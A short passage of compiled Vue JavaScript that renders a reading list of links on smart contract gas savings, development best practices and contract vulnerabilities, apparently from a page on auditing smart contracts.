Ways of Reducing the Gas Consumption of your Smart Contracts"),t(a)])]),n("li",null,[n("a",ts,[s("smart-contract-development-best-practices"),t(a)])]),n("li",null,[n("a",es,[s("https://immunefi.com/learn/"),t(a)])]),n("li",null,[n("a",ps,[s("The Encyclopedia of Smart Contract Attacks and Vulnerabilities"),t(a)])])])])])}const rs=p(l,[["render",os],["__file","Intelligent_audit_contract.html.vue"]]);export{rs as default};
